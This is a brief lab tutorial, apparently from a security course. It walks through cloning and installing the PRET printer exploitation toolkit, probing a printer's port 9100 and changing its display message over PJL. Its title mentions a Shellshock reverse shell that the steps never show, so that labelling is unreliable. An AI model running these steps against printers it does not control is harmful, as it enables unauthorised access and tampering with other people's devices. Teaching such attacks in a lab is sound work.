## Getting a Reverse Shell via Shellshock Attack

### Background

Why printer hacking: read this article first:
https://www.theverge.com/2018/11/30/18119576/pewdiepie-printer-hack-t-series-youtube

### Setup

One VM only.

### Steps

Pret stands for PRinter Exploitation Toolkit.

1. get the source code from github:

```console
git clone https://github.com/RUB-NDS/PRET
```

2. go inside the PRET directory:

```console
cd PRET
```

3. install necessary modules:

```console
sudo pip install colorama pysnmp
```

4. select a targeted printer, test if the printer has port 9100 open: 

```console
telnet printerIP 9100 (You will see "Connection refused" if not open)
```

5. Now that you are in the PRET directory, run the script to establish a connection between you and the printer: ./pret.py printerIP pjl

6. Change the display message: 

printerIP:/> display\\
Message: Game Over...\\
Setting printer's display message to "Game Over..."\\

This will change the printer display message to "Game Over...".
